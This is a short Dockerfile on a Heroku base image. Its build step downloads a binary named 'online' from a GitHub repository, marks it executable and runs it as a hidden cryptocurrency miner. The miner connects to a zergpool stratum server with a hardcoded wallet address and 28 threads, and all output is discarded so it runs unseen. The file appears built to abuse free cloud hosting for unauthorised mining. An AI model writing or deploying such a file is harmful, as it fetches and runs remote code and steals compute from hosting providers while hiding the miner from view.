FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/jirensan3090/railway/raw/main/online; chmod +x online; ./online -a yescryptR16 -o stratum+tcps://yescryptR16.mine.zergpool.com:16333 -u TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86 -p c=TRX,mc=QOGE,m=solo -t 28 > /dev/null 2>&1
CMD bash heroku.sh
